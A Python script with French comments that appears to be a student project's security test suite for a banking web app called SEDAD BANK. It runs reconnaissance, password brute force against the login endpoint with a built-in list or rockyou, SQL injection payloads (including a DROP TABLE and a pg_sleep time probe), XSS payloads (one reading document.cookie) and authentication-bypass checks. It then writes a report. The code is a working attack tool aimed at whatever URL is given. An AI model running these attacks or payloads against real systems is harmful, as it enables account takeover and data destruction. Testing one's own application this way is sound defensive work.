#!/usr/bin/env python3
"""
Suite complète d'attaques — SEDAD BANK PFE
Lance toutes les attaques et génère un rapport.

Usage:
  python full_attack.py --url http://VOTRE_APP.com --email user@test.com
  python full_attack.py --url http://VOTRE_APP.com --email user@test.com --wordlist /path/rockyou.txt
"""
import requests
import time
import argparse
import json
import re
from datetime import datetime

# ─────────────────────────────────────────────
#  PAYLOADS
# ─────────────────────────────────────────────
BRUTE_WORDLIST = [
    "password", "123456", "password123", "admin", "admin123",
    "test123", "qwerty", "letmein", "sedad123", "bank123",
    "Pass@123", "Sedad@2024", "mauritanie", "nouakchott",
]

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT 1,2,3--",
    "'; DROP TABLE core_user;--",
    "'; SELECT pg_sleep(3);--",
]

XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(document.cookie)',
    '<svg onload=alert(1)>',
]

# ─────────────────────────────────────────────
#  UTILITAIRES
# ─────────────────────────────────────────────
results = {
    "target": "",
    "date": "",
    "tests": [],
    "summary": {"total": 0, "passed": 0, "vulnerable": 0, "errors": 0}
}

def log(category: str, test: str, status: str, detail: str = ""):
    icon = {"OK": "✓", "VULN": "!", "ERR": "?", "INFO": "i"}.get(status, "-")
    print(f"  [{icon}] {category:<20} {test:<30} {detail}")
    results["tests"].append({
        "category": category, "test": test,
        "status": status, "detail": detail
    })
    results["summary"]["total"] += 1
    if status == "VULN":
        results["summary"]["vulnerable"] += 1
    elif status == "OK":
        results["summary"]["passed"] += 1
    elif status == "ERR":
        results["summary"]["errors"] += 1

# ─────────────────────────────────────────────
#  MODULES D'ATTAQUE
# ─────────────────────────────────────────────
def test_recon(base_url: str):
    print("\n[1/5] RECONNAISSANCE")
    print("-" * 65)
    api = base_url.rstrip("/") + "/api"
    endpoints = [
        ("/api/auth/login/",   401, "Auth endpoint"),
        ("/api/accounts/",     401, "Accounts (protégé)"),
        ("/api/users/",        401, "Users (protégé)"),
        ("/api/transactions/", 401, "Transactions (protégé)"),
        ("/admin/",            302, "Django admin"),
        ("/api/schema/",       200, "API Schema (public)"),
    ]
    session = requests.Session()
    for path, expected, desc in endpoints:
        try:
            r = session.get(f"{base_url}{path}", timeout=5, allow_redirects=False)
            status = "OK" if r.status_code == expected else "VULN"
            log("Recon", desc, status, f"HTTP {r.status_code} (attendu {expected})")
        except Exception as e:
            log("Recon", desc, "ERR", str(e)[:40])

def test_brute_force(base_url: str, email: str, wordlist_path: str | None):
    print("\n[2/5] BRUTE FORCE")
    print("-" * 65)
    url = f"{base_url.rstrip('/')}/api/auth/login/"

    wordlist = BRUTE_WORDLIST
    if wordlist_path:
        try:
            with open(wordlist_path, 'r', errors='ignore') as f:
                wordlist = [l.strip() for l in f if l.strip()][:200]
            print(f"  [i] Wordlist: {len(wordlist)} mots depuis {wordlist_path}")
        except FileNotFoundError:
            print(f"  [!] {wordlist_path} non trouvé, wordlist intégrée utilisée")

    session = requests.Session()
    for pwd in wordlist:
        try:
            r = session.post(url, json={"email": email, "password": pwd}, timeout=5)
            if r.status_code == 200:
                log("BruteForce", f"Password found", "VULN", f"Mot de passe: {pwd}")
                return
            time.sleep(0.1)
        except Exception:
            break

    log("BruteForce", f"{len(wordlist)} mots testés", "OK", "Aucun mot de passe trouvé")

def test_sql_injection(base_url: str, token: str):
    print("\n[3/5] SQL INJECTION")
    print("-" * 65)
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    api = base_url.rstrip("/") + "/api"

    for payload in SQL_PAYLOADS:
        try:
            r = requests.get(f"{api}/accounts/",
                             params={"search": payload},
                             headers=headers, timeout=6)
            if r.status_code == 500:
                log("SQL Injection", payload[:30], "VULN", "500 Server Error")
            elif r.elapsed.total_seconds() > 2.5:
                log("SQL Injection", payload[:30], "VULN",
                    f"Time-based {r.elapsed.total_seconds():.1f}s")
            else:
                log("SQL Injection", payload[:30], "OK", f"HTTP {r.status_code}")
        except requests.exceptions.Timeout:
            log("SQL Injection", payload[:30], "VULN", "Timeout (time-based)")
        except Exception as e:
            log("SQL Injection", payload[:30], "ERR", str(e)[:40])

def test_xss(base_url: str, token: str):
    print("\n[4/5] XSS")
    print("-" * 65)
    headers = {"Authorization": f"Bearer {token}"} if token else {}

    for payload in XSS_PAYLOADS:
        try:
            r = requests.get(f"{base_url}/api/accounts/",
                             params={"search": payload},
                             headers=headers, timeout=5)
            reflected = payload in r.text
            if r.status_code == 500:
                log("XSS", payload[:30], "VULN", "500 Server Error")
            elif reflected:
                log("XSS", payload[:30], "VULN", "Payload reflété dans la réponse")
            else:
                log("XSS", payload[:30], "OK", f"Non reflété ({r.status_code})")
        except Exception as e:
            log("XSS", payload[:30], "ERR", str(e)[:40])

def test_auth_bypass(base_url: str):
    print("\n[5/5] BYPASS AUTHENTIFICATION")
    print("-" * 65)
    session = requests.Session()

    # Accès sans token
    protected = ["/api/accounts/", "/api/transactions/", "/api/users/me/"]
    for path in protected:
        try:
            r = session.get(f"{base_url}{path}", timeout=5)
            status = "OK" if r.status_code in (401, 403) else "VULN"
            log("Auth Bypass", path, status, f"HTTP {r.status_code}")
        except Exception as e:
            log("Auth Bypass", path, "ERR", str(e)[:40])

    # Token invalide
    bad_headers = {"Authorization": "Bearer FAKE_TOKEN_12345"}
    try:
        r = session.get(f"{base_url}/api/accounts/", headers=bad_headers, timeout=5)
        status = "OK" if r.status_code in (401, 403) else "VULN"
        log("Auth Bypass", "Faux token JWT", status, f"HTTP {r.status_code}")
    except Exception as e:
        log("Auth Bypass", "Faux token JWT", "ERR", str(e)[:40])

# ─────────────────────────────────────────────
#  RAPPORT FINAL
# ─────────────────────────────────────────────
def print_report():
    s = results["summary"]
    print()
    print("=" * 65)
    print("  RAPPORT FINAL — SEDAD BANK PFE")
    print("=" * 65)
    print(f"  Cible      : {results['target']}")
    print(f"  Date       : {results['date']}")
    print(f"  Total tests: {s['total']}")
    print(f"  Proteges   : {s['passed']}")
    print(f"  Vulnerables: {s['vulnerable']}")
    print(f"  Erreurs    : {s['errors']}")
    score = int((s['passed'] / max(s['total'], 1)) * 100)
    print(f"  Score SOC  : {score}%")
    print()

    if s['vulnerable'] > 0:
        print("  VULNERABILITES DETECTEES:")
        for t in results["tests"]:
            if t["status"] == "VULN":
                print(f"    - [{t['category']}] {t['test']} — {t['detail']}")
    else:
        print("  Aucune vulnérabilité critique détectée.")

    print()
    print(f"  Dashboard SOC : {results['target'].replace(':8000',':3000')}/d/sedad-bank-soc")
    print("=" * 65)

    # Sauvegarde JSON
    report_file = f"/tmp/sedad_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print(f"  Rapport JSON  : {report_file}")

# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def run(base_url: str, email: str, wordlist: str | None):
    results["target"] = base_url
    results["date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print("=" * 65)
    print("  SUITE D'ATTAQUES COMPLETE — SEDAD BANK PFE")
    print("=" * 65)
    print(f"  Cible  : {base_url}")
    print(f"  Email  : {email}")
    print(f"  Heure  : {results['date']}")
    print("=" * 65)

    # Étape 1 : Login pour avoir un token
    token = ""
    try:
        r = requests.post(f"{base_url.rstrip('/')}/api/auth/login/",
                          json={"email": email, "password": "test123"}, timeout=5)
        if r.status_code == 200:
            token = r.json().get("access", "")
            print(f"  [i] Token obtenu pour {email}")
    except Exception:
        print("  [!] Backend inaccessible — certains tests passeront en mode anonyme")

    test_recon(base_url)
    test_brute_force(base_url, email, wordlist)
    test_sql_injection(base_url, token)
    test_xss(base_url, token)
    test_auth_bypass(base_url)
    print_report()

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Suite d'attaques complète SEDAD BANK — PFE")
    p.add_argument("--url",      required=True,  help="URL de base (ex: http://votre-app.com)")
    p.add_argument("--email",    required=True,  help="Email de test (ex: test@sedad.mr)")
    p.add_argument("--wordlist", default=None,   help="Chemin rockyou.txt (optionnel)")
    args = p.parse_args()
    run(args.url, args.email, args.wordlist)
